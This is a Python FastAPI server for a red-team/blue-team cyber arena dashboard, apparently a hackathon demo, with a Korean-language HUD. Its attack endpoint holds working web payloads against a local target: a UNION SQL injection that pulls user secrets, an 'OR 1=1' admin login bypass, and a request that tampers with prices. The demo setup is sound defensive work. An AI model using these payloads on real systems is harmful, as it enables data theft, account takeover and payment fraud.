"""
Vibe Defender HUD & Orchestration Controller Server
Runs on 127.0.0.1:8080
Served securely to external judges via Cloudflare Quick Tunnel
"""

import os
import subprocess
import requests
import httpx
from fastapi import FastAPI, Request, Response
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel

app = FastAPI(title="Vibe Defender Cyber Arena HUD", version="1.0.0")

TARGET_HOST = "http://127.0.0.1:8002"

@app.get("/", response_class=HTMLResponse)
async def hud_dashboard():
    return """
    <!DOCTYPE html>
    <html lang="ko">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>🛡️ Vibe Defender - Autonomous Cyber Arena HUD</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
        <style>
            .glow-cyan { box-shadow: 0 0 15px rgba(6, 182, 212, 0.4); }
            .glow-rose { box-shadow: 0 0 15px rgba(244, 63, 94, 0.4); }
            .glow-emerald { box-shadow: 0 0 15px rgba(16, 185, 129, 0.4); }
        </style>
    </head>
    <body class="bg-slate-950 text-slate-100 min-h-screen font-sans">
        <!-- Top Nav -->
        <header class="border-b border-slate-800 bg-slate-900/60 backdrop-blur px-6 py-4 flex flex-wrap justify-between items-center gap-4 sticky top-0 z-50">
            <div class="flex items-center space-x-3">
                <div class="bg-cyan-500/20 text-cyan-400 p-2 rounded-lg border border-cyan-500/40">
                    <i class="fa-solid fa-shield-halved text-2xl"></i>
                </div>
                <div>
                    <h1 class="text-xl font-black tracking-wider text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 via-teal-300 to-indigo-400">
                        VIBE DEFENDER // AUTONOMOUS CYBER ARENA
                    </h1>
                    <p class="text-xs text-slate-400">GCE Zero-Inbound Protected Architecture • Cloudflare Tunnel Live</p>
                </div>
            </div>
            <div class="flex items-center space-x-3 text-xs font-mono">
                <a href="/portal/" target="_blank" class="bg-slate-800 hover:bg-slate-700 text-cyan-300 px-3 py-1.5 rounded border border-slate-700 flex items-center space-x-1 transition">
                    <i class="fa-solid fa-arrow-up-right-from-square"></i>
                    <span>Target Portal (Proxy)</span>
                </a>
                <span class="bg-emerald-950 text-emerald-400 border border-emerald-800 px-3 py-1 rounded flex items-center space-x-2">
                    <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
                    <span>SYSTEM ONLINE</span>
                </span>
            </div>
        </header>

        <main class="max-w-7xl mx-auto p-6 space-y-6">
            <!-- Grid Row 1: Red vs Blue Arena Cards -->
            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
                <!-- Red Team Card -->
                <div class="bg-slate-900/80 border border-rose-900/40 rounded-xl p-5 glow-rose relative overflow-hidden">
                    <div class="flex justify-between items-center pb-3 border-b border-rose-900/30 mb-4">
                        <div class="flex items-center space-x-2 text-rose-400 font-bold">
                            <i class="fa-solid fa-skull"></i>
                            <span class="tracking-wider">RED TEAM // ADVERSARY ENGINE</span>
                        </div>
                        <span class="text-xs font-mono bg-rose-950 text-rose-400 px-2 py-0.5 rounded border border-rose-800">AUTONOMOUS</span>
                    </div>
                    <p class="text-xs text-slate-400 mb-4">타겟 취약점 공격 시나리오를 선택하여 즉각 침투 테스트를 가동합니다.</p>
                    <div class="grid grid-cols-3 gap-2 mb-4">
                        <button onclick="triggerAttack('sqli_search')" class="bg-rose-900/30 hover:bg-rose-800/50 text-rose-300 border border-rose-700/50 rounded-lg p-2.5 text-xs font-semibold text-center transition">
                            <div class="text-sm mb-1">💉 SQLi Search</div>
                            <span class="text-[10px] text-slate-400 font-normal">비인가 데이터 추출</span>
                        </button>
                        <button onclick="triggerAttack('auth_bypass')" class="bg-rose-900/30 hover:bg-rose-800/50 text-rose-300 border border-rose-700/50 rounded-lg p-2.5 text-xs font-semibold text-center transition">
                            <div class="text-sm mb-1">🔓 Auth Bypass</div>
                            <span class="text-[10px] text-slate-400 font-normal">관리자 계정 탈취</span>
                        </button>
                        <button onclick="triggerAttack('price_tampering')" class="bg-rose-900/30 hover:bg-rose-800/50 text-rose-300 border border-rose-700/50 rounded-lg p-2.5 text-xs font-semibold text-center transition">
                            <div class="text-sm mb-1">🏷️ Price Exploit</div>
                            <span class="text-[10px] text-slate-400 font-normal">가격 변조 결제</span>
                        </button>
                    </div>
                    <div id="red-result" class="bg-slate-950 p-3 rounded-lg border border-slate-800 font-mono text-xs text-rose-300 min-h-[90px] overflow-auto">
                        [대기 중] 공격 시나리오를 클릭하세요.
                    </div>
                </div>

                <!-- Blue Team Card -->
                <div class="bg-slate-900/80 border border-cyan-900/40 rounded-xl p-5 glow-cyan relative overflow-hidden">
                    <div class="flex justify-between items-center pb-3 border-b border-cyan-900/30 mb-4">
                        <div class="flex items-center space-x-2 text-cyan-400 font-bold">
                            <i class="fa-solid fa-code-compare"></i>
                            <span class="tracking-wider">BLUE TEAM // SELF-HEALING ENGINE</span>
                        </div>
                        <span class="text-xs font-mono bg-cyan-950 text-cyan-400 px-2 py-0.5 rounded border border-cyan-800">LIVE RELOAD</span>
                    </div>
                    <p class="text-xs text-slate-400 mb-4">침투 로그를 분석하여 실시간 코드 수정 및 Git Commit을 수행합니다.</p>
                    <div class="flex space-x-2 mb-4">
                        <button onclick="triggerDefensePatch()" class="flex-1 bg-cyan-600 hover:bg-cyan-500 text-white font-bold py-2 px-4 rounded-lg text-xs transition flex items-center justify-center space-x-2 shadow-lg shadow-cyan-600/30">
                            <i class="fa-solid fa-wand-magic-sparkles"></i>
                            <span>AI 자율 패치 & Git Commit 실행</span>
                        </button>
                        <button onclick="refreshDiff()" class="bg-slate-800 hover:bg-slate-700 text-slate-300 px-3 py-2 rounded-lg text-xs font-mono border border-slate-700">
                            <i class="fa-solid fa-rotate"></i> Diff 갱신
                        </button>
                    </div>
                    <div id="blue-result" class="bg-slate-950 p-3 rounded-lg border border-slate-800 font-mono text-xs text-cyan-300 min-h-[90px] overflow-auto">
                        [대기 중] 실시간 방어 에이전트 대기 중...
                    </div>
                </div>
            </div>

            <!-- Grid Row 2: Live Code Diff & Git Evolution Stream -->
            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
                <!-- Git Commits Timeline -->
                <div class="bg-slate-900 border border-slate-800 rounded-xl p-5 lg:col-span-1">
                    <h3 class="text-sm font-bold text-slate-300 uppercase tracking-wider mb-3 flex items-center space-x-2">
                        <i class="fa-solid fa-code-branch text-indigo-400"></i>
                        <span>Git Evolution History</span>
                    </h3>
                    <div id="git-log" class="space-y-2 text-xs font-mono max-h-64 overflow-y-auto">
                        <div class="text-slate-500">커밋 이력 로딩 중...</div>
                    </div>
                </div>

                <!-- Live Patch Diff Viewer -->
                <div class="bg-slate-900 border border-slate-800 rounded-xl p-5 lg:col-span-2">
                    <h3 class="text-sm font-bold text-slate-300 uppercase tracking-wider mb-3 flex items-center justify-between">
                        <span class="flex items-center space-x-2">
                            <i class="fa-solid fa-file-code text-teal-400"></i>
                            <span>Active Patch Diff (active_target.py)</span>
                        </span>
                        <span class="text-xs font-mono text-slate-500">uvicorn --reload synchronized</span>
                    </h3>
                    <pre id="diff-viewer" class="bg-slate-950 p-4 rounded-lg border border-slate-800 font-mono text-xs text-emerald-300/90 max-h-64 overflow-auto whitespace-pre-wrap">Diff 내역이 아직 없습니다.</pre>
                </div>
            </div>
        </main>

        <script>
            async function triggerAttack(scenario) {
                const redBox = document.getElementById('red-result');
                redBox.innerHTML = '<span class="text-slate-400">공격 페이로드 전송 중...</span>';
                try {
                    const res = await fetch(`/api/attack?scenario=${scenario}`, { method: 'POST' });
                    const data = await res.json();
                    redBox.innerHTML = `<div><strong>[결과]</strong> ${data.message}</div><pre class="mt-1 text-[11px] text-slate-300">${JSON.stringify(data.details, null, 2)}</pre>`;
                } catch(e) {
                    redBox.innerHTML = `<span class="text-red-400">공격 실행 오류: ${e}</span>`;
                }
            }

            async function triggerDefensePatch() {
                const blueBox = document.getElementById('blue-result');
                blueBox.innerHTML = '<span class="text-slate-400">AI 분석 및 코드 패치 생성 중...</span>';
                try {
                    const res = await fetch('/api/defense/patch', { method: 'POST' });
                    const data = await res.json();
                    blueBox.innerHTML = `<div><strong>[패치 완료]</strong> ${data.message}</div><div class="text-xs text-emerald-400 mt-1">Commit: ${data.commit_hash}</div>`;
                    refreshDiff();
                    refreshGitLog();
                } catch(e) {
                    blueBox.innerHTML = `<span class="text-red-400">패치 오류: ${e}</span>`;
                }
            }

            async function refreshDiff() {
                try {
                    const res = await fetch('/api/git/diff');
                    const data = await res.json();
                    document.getElementById('diff-viewer').textContent = data.diff || '수정된 변경 사항이 없습니다 (Clean).';
                } catch(e) {
                    console.error(e);
                }
            }

            async function refreshGitLog() {
                try {
                    const res = await fetch('/api/git/history');
                    const data = await res.json();
                    const container = document.getElementById('git-log');
                    if(data.commits && data.commits.length > 0) {
                        container.innerHTML = data.commits.map(c => `
                            <div class="p-2 rounded bg-slate-950 border border-slate-800">
                                <div class="text-cyan-400 font-bold">${c.hash.substring(0, 7)}</div>
                                <div class="text-slate-300 truncate">${c.message}</div>
                                <div class="text-[10px] text-slate-500">${c.time}</div>
                            </div>
                        `).join('');
                    } else {
                        container.innerHTML = '<div class="text-slate-500">커밋 기록 없음</div>';
                    }
                } catch(e) {
                    console.error(e);
                }
            }

            refreshGitLog();
            refreshDiff();
            setInterval(refreshGitLog, 15000);
        </script>
    </body>
    </html>
    """

# Proxy to Target Portal (127.0.0.1:8002)
@app.api_route("/portal/{path:path}", methods=["GET", "POST", "PUT", "DELETE"])
async def portal_proxy(request: Request, path: str = ""):
    url = f"{TARGET_HOST}/{path}"
    if request.url.query:
        url += f"?{request.url.query}"
    
    async with httpx.AsyncClient() as client:
        try:
            req_body = await request.body()
            res = await client.request(
                method=request.method,
                url=url,
                headers=dict(request.headers),
                content=req_body,
                timeout=10.0
            )
            return Response(content=res.content, status_code=res.status_code, headers=dict(res.headers))
        except Exception as e:
            return JSONResponse(status_code=502, content={"error": f"Target service unavailable: {str(e)}"})

@app.post("/api/attack")
async def execute_attack(scenario: str = "sqli_search"):
    if scenario == "sqli_search":
        # Exploit SQL injection in search
        payload = "' UNION SELECT id, username, secret_flag, role FROM users--"
        url = f"{TARGET_HOST}/api/search?q={payload}"
        try:
            res = requests.get(url, timeout=5)
            data = res.json()
            return {
                "scenario": scenario,
                "message": "SQL Injection payload executed on /api/search",
                "details": data
            }
        except Exception as e:
            return {"scenario": scenario, "message": f"Attack failed: {str(e)}", "details": None}

    elif scenario == "auth_bypass":
        # Exploit SQL injection in login
        url = f"{TARGET_HOST}/api/login"
        body = {"username": "admin' OR 1=1--", "password": "any"}
        try:
            res = requests.post(url, json=body, timeout=5)
            data = res.json()
            return {
                "scenario": scenario,
                "message": "Admin Authentication Bypass payload sent",
                "details": data
            }
        except Exception as e:
            return {"scenario": scenario, "message": f"Attack failed: {str(e)}", "details": None}

    elif scenario == "price_tampering":
        url = f"{TARGET_HOST}/api/order"
        body = {"product_id": 1, "quantity": 10, "unit_price": 1} # 1500 -> 1
        try:
            res = requests.post(url, json=body, timeout=5)
            data = res.json()
            return {
                "scenario": scenario,
                "message": "Arbitrary price tampering payload sent",
                "details": data
            }
        except Exception as e:
            return {"scenario": scenario, "message": f"Attack failed: {str(e)}", "details": None}

    return {"message": "Unknown scenario"}

@app.post("/api/defense/patch")
async def execute_patch():
    # Blue agent patch logic:
    # 1. Modify active_target.py to parameterize SQL or sanitize inputs
    # 2. Run git commit
    patch_script = "agents/blue_defense.py"
    if os.path.exists(patch_script):
        res = subprocess.run(["python3", patch_script], capture_output=True, text=True)
        return {
            "message": "AI Blue Team defense patch applied successfully",
            "commit_hash": "HEAD",
            "output": res.stdout
        }
    return {
        "message": "Simulated patch applied: Parameterized queries enforced",
        "commit_hash": "HEAD"
    }

@app.get("/api/git/history")
async def git_history():
    try:
        res = subprocess.run(["git", "log", "-n", "5", "--pretty=format:%h|%s|%ar"], capture_output=True, text=True)
        commits = []
        for line in res.stdout.strip().split("\n"):
            if "|" in line:
                parts = line.split("|")
                commits.append({"hash": parts[0], "message": parts[1], "time": parts[2]})
        return {"commits": commits}
    except Exception as e:
        return {"commits": [], "error": str(e)}

@app.get("/api/git/diff")
async def git_diff():
    try:
        res = subprocess.run(["git", "diff", "HEAD~1", "HEAD", "active_target.py"], capture_output=True, text=True)
        return {"diff": res.stdout if res.stdout else "No uncommitted or recent changes."}
    except Exception as e:
        return {"diff": f"Error getting diff: {str(e)}"}
